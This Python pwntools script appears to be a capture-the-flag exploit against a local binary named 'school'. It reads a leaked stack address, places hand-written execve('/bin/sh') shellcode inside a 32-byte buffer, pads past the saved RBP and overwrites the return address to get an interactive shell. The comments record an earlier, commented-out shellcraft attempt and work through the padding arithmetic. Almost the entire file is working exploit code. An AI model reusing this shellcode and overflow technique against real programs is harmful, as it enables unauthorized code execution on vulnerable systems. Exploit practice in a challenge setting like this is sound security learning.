from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

# this shellcode i compiled using shellcraft was longer than the available buffer so I was initially putting the shellcode after the return address and then overflowing the buffer (0x20) and the old RBP (0x8) and then the address of the shellcode and then the shell code itself
# that didnt work so im now trying witha smaller shellcode that fits within the buffer 0x20

#-------------------------------------------------------------#
#shellcraft payload


# shell_code = asm(shellcraft.amd64.linux.sh()) 

# # p = process('./school')
# # gdb.attach(p, "start")

# prompt = p.recvline()
# print prompt

# array = prompt.split(" ")
# addr = array[6]
# addr = addr[:-1]
# int_addr = int(addr, 16)
# sh_addr = int_addr + 0x36 #0x20+0x8+0x8
# le_sh_addr = p64(sh_addr)
# # print le_sh_addr
# # print shell_code

# p.sendline('A'*0x28 + le_sh_addr + shell_code + '\n')


#------------------------------------------------------------#
#shorter payload

p = process('./school')
gdb.attach(p, "start")

bin_sh = """
/* push '/bin///sh\x00' */
push 0x68
mov rax, 0x732f2f2f6e69622f
push rax 
/* call execve(rsp, 0, 0) */
mov rdi, rsp
xor esi, esi
push 0x3b
pop rax
cdq /* Set rdx to 0 since rax is known to be positive */
syscall
"""
shell_code = asm(bin_sh)
# print len(shell_code)

prompt = p.recvline()
print prompt

array = prompt.split(" ")
addr = array[6]
addr = addr[:-1]
int_addr = int(addr, 16)
le_sh_addr = p64(int_addr)
print le_sh_addr
p.send(shell_code + 'A'*0x10 + le_sh_addr + '\n')
#buffer = 0x20 or 32bytes
#rbp = 0x8 or 8 bytes
#len(shell_code) = 24bytes 
#thus, padding reqd = 32+8-24 = 16 or 0x10

p.interactive()
